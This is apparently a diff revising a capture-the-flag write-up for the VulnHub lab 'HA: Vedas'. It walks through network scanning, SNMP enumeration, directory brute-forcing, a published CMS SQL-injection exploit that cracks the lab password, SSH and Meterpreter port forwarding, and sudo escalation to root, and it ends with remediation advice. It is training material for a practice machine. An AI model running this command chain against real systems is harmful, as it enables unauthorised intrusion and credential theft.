@@ -1,161 +1,166 @@
 # HA: Vedas — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.0.163 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.0.163 |
 | **Difficulty** | Medium |
 | **OS** | Linux |
-| **Flags** | Rig Veda (SNMP), Yajur Veda (CMS dashboard), Sama Veda (port 5000), Atharva Veda (/root/final.txt) |
-| **Credentials** | atri : ansuya (CMS/SSH) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/ha-vedas,481/) |
+| **Goal** | 4 flags (Rig Veda, Yajur Veda, Sama Veda, Atharva Veda) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-vedas-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-SNMP enum (Flag 1) → CeWL wordlist → dirb finds `/Kashyapa` CMS → EDB-46635 SQLi → SSH (atri) → Meterpreter port forward port 5000 (Flag 3) → su vedas → sudo bash → root (Flag 4)
+Four flags are hidden across multiple services. SNMP enumeration reveals Flag 1. A CMS login page found via a custom wordlist brute-force hosts an SQL injection vulnerability that yields credentials for Flag 2. Meterpreter port forwarding exposes an internal service containing Flag 3. Lateral movement to the `vedas` user and a `sudo bash` escalation reach root for Flag 4.
 
 ## Methodology
 
-1. Network discovery (TCP + UDP/SNMP)
+1. Host and service discovery (Nmap TCP + UDP, SNMP)
 2. SNMP enumeration for Flag 1
-3. Web enumeration with custom wordlist
-4. CMS exploit (EDB-46635) for credentials and Flag 2
-5. SSH + Meterpreter pivot to internal port 5000 for Flag 3
-6. Lateral movement and sudo privesc for Flag 4
+3. Custom wordlist generation with CeWL; directory brute-force with Dirb
+4. SQL injection via Exploit-DB 46635.py for CMS credentials and Flag 2
+5. SSH login with Metasploit; session upgrade to Meterpreter
+6. Port forwarding to expose internal service for Flag 3
+7. Lateral movement to `vedas` user; `sudo bash` for root and Flag 4
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery and Port Scan
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.0.0/24
+netdiscover
+# Target: 192.168.0.163
+
 nmap -A 192.168.0.163
-# Ports: 22/SSH, 80/HTTP
+# TCP: 22 (SSH), 80 (HTTP)
+
 nmap -sU 192.168.0.163
-# Port: 161/SNMP
+# UDP: 161 (SNMP)
 ```
 
-![Nmap TCP scan](images/01-nmap.png)
-
----
+![Netdiscover and Nmap](images/01-nmap.png)
 
 ## Step 2: SNMP Enumeration — Flag 1 (Rig Veda)
 
 ```bash
 msfconsole -q
 use auxiliary/scanner/snmp/snmp_enum
-set rhosts 192.168.0.163
+set RHOSTS 192.168.0.163
 exploit
 ```
 
-The SNMP output reveals **Flag 1: Rig Veda**.
+**Flag 1: Rig Veda** is embedded in the SNMP response.
 
----
+![SNMP Flag 1](images/02-snmp-flag.png)
 
-## Step 3: Custom Wordlist + Directory Brute Force
+## Step 3: Custom Wordlist and Directory Brute-Force
+
+The web page at port 80 contains text. Use CeWL to build a wordlist from it:
 
 ```bash
 cewl http://192.168.0.163/ > dict.txt
+```
+
+Run Dirb with the custom wordlist:
+
+```bash
 dirb http://192.168.0.163/ dict.txt
-# Finds: /Kashyapa (CMS)
 ```
 
-![CeWL wordlist generation](images/02-cewl.png)
+Hidden directory `/Kashyapa` is found — it hosts a CMS login page.
 
----
+## Step 4: SQL Injection to Dump Credentials — Flag 2 (Yajur Veda)
 
-## Step 4: CMS Exploit (EDB-46635) + Flag 2
-
-Search ExploitDB for the CMS used in `/Kashyapa`:
+Search Exploit-DB for the CMS:
 
 ```bash
-searchsploit Kashyapa
-# EDB-46635 — SQL Injection
+searchsploit cms
+# Exploit 46635.py
+```
+
+Download and run the SQL injection exploit:
+
+```bash
 searchsploit -m 46635
-python 46635.py -u http://192.168.0.163 /Kashyapa/ --crack -w dict.txt
+python 46635.py -u http://192.168.0.163/Kashyapa/ --crack -w /root/dict.txt
 ```
 
-Credentials found: **atri : ansuya**
+Credentials recovered: **`atri:anasuya`**
 
-Log in at `/Kashyapa/admin/login.php` → **Flag 2: Yajur Veda** appears on dashboard.
+Log in at `/Kashyapa/admin/login.php`. The dashboard reveals **Flag 2: Yajur Veda**.
 
-![ExploitDB lookup](images/03-exploitdb.png)
-![CMS admin dashboard — Flag 2](images/04-flag2-dashboard.png)
+![CMS SQLi — credentials and Flag 2](images/03-sqli-creds.png)
 
----
-
-## Step 5: SSH + Meterpreter Pivot — Flag 3 (Sama Veda)
+## Step 5: SSH Access via Metasploit
 
 ```bash
-# Metasploit SSH login
+msfconsole -q
 use auxiliary/scanner/ssh/ssh_login
-set rhosts 192.168.0.163
-set username atri
-set password ansuya
+set RHOSTS 192.168.0.163
+set USERNAME atri
+set PASSWORD anasuya
 exploit
-# sessions -u 1   (upgrade to Meterpreter)
+# Session 1 established
+
+sessions -u 1
+# Upgrade to Meterpreter (session 2)
 ```
 
-Inside Meterpreter, discover internal port 5000:
+## Step 6: Internal Service Discovery and Port Forwarding — Flag 3 (Sama Veda)
+
+In the Meterpreter session:
 
 ```bash
-netstat -an | grep LISTEN
-```
+sessions -i 2
+shell
+netstat -tulnp
+# Port 5000 listening on 127.0.0.1
 
-Port-forward to access it from the attacker:
-
-```bash
+# Back in Meterpreter:
 portfwd add -l 5000 -p 5000 -r 127.0.0.1
 ```
 
-Browse `http://127.0.0.1:5000` → **Flag 3: Sama Veda**.
+Browse `http://127.0.0.1:5000` on the attacker machine. The page displays **Flag 3: Sama Veda**.
 
----
+![Port forwarding to internal service](images/04-port-forward.png)
 
-## Step 6: Lateral Movement
+## Step 7: Lateral Movement and Privilege Escalation — Flag 4 (Atharva Veda)
 
-From the port-5000 page, note the "magic hash" / credential hint, then:
+From the shell session:
 
 ```bash
-ssh atri@192.168.0.163
-cd /home && ls
-# user: vedas
+cd /home
+ls
+# Users: atri, vedas
+
 su vedas
-# (use password from port-5000 page)
-```
+# Use password from earlier context
 
----
-
-## Step 7: Privilege Escalation — Flag 4 (Atharva Veda)
-
-```bash
 sudo -l
-# (ALL) NOPASSWD: /bin/bash
+# vedas can run sudo
+
 sudo bash
-id
-# uid=0(root)
+whoami
+# root
+
 cd /root
 cat final.txt
 # Flag 4: Atharva Veda
 ```
 
-![Root shell and final flag](images/05-root.png)
-
----
+![Root flag — Atharva Veda](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **SNMP on UDP 161** — always scan UDP; SNMP v1/v2c with default community strings leaks system info
-2. **CeWL + custom wordlist** — standard wordlists miss theme-specific directories; generate site-specific ones
-3. **CMS SQL injection** — EDB-46635 highlights unparameterised queries in login forms
-4. **Internal port forwarding** — post-exploitation pivoting exposes admin panels invisible from the outside
-5. **Overly permissive sudo** — `sudo bash` with NOPASSWD is an instant root
+- SNMP (UDP/161) with default community string `public` exposes sensitive system information and flags without any authentication.
+- Wordlist-based directory brute-force with CeWL produces highly targeted lists from the target's own content, outperforming generic lists on custom CMSes.
+- SQL injection in older CMS platforms is common; always search Exploit-DB with the exact CMS name and version.
+- Internal services listening only on `localhost` can be reached from the attacker via Meterpreter port forwarding.
+- Overly permissive `sudo` rules (`sudo bash` or `sudo su`) are a direct path to root.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SNMP default community string | Change community string, restrict SNMP to management IPs |
-| CMS SQL injection | Parameterise queries, update CMS |
-| SSH with weak password | Enforce key-based SSH, disable password auth |
-| sudo NOPASSWD on bash | Remove from sudoers, use least privilege |
-| Internal service exposed | Firewall internal services; require authentication |
+|---|---|
+| SNMP with default community string | Disable SNMP or use SNMPv3 with authentication |
+| CMS SQL injection (CVE via 46635) | Upgrade the CMS; use parameterized queries |
+| Weak credentials (`atri:anasuya`) | Enforce strong password policy |
+| Internal service exposed without authentication | Add authentication to the service; restrict with firewall |
+| Unrestricted `sudo bash` for regular user | Remove unnecessary sudo rights; use least-privilege `sudoers` rules |
